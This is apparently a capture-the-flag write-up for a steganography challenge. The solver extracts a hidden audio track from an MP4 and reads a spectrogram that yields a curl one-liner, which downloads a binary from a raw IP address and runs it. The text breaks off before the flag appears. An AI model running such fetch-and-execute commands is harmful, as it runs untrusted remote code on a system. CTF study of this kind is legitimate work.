## Sorry, you're NOT a sigma!
The lion says solve this challenge. You seem to have a good **track** record at doing so.

## Solution

Because the word track is bolded, I decide to take a look at the files audio tracks by running `ffmpeg -i lion.mp4`, which showed me this:

```bash
  Stream #0:1(und): Audio: aac (LC) (mp4a / 0x6134706D), 48000 Hz, stereo, fltp, 128 kb/s (default)
    Metadata:
      handler_name    : SoundHandler
      vendor_id       : [0][0][0][0]
  Stream #0:2(und): Audio: aac (LC) (mp4a / 0x6134706D), 22050 Hz, stereo, fltp, 121 kb/s
    Metadata:
      handler_name    : SoundHandler
      vendor_id       : [0][0][0][0]
```

This means that there are two audio files. I extract the second one using `ffmpeg -i lion.mp4 -map 0:a:1 -acodec pcm_s16le audio2.wav`. Listening to audio2.wav, it sounds like weird distorted alien noises, which prompts me to open the file in Audacity. 

Opening audio2.wav in Audacity and viewing as Spectrogram and get this payload:


```bash
curl -s http://23.179.17.40:6969/roar -o /tmp/roar && chmod +x /tmp/roar && /tmp/roar
````

Running this command in my terminal gives me the flag:

```c
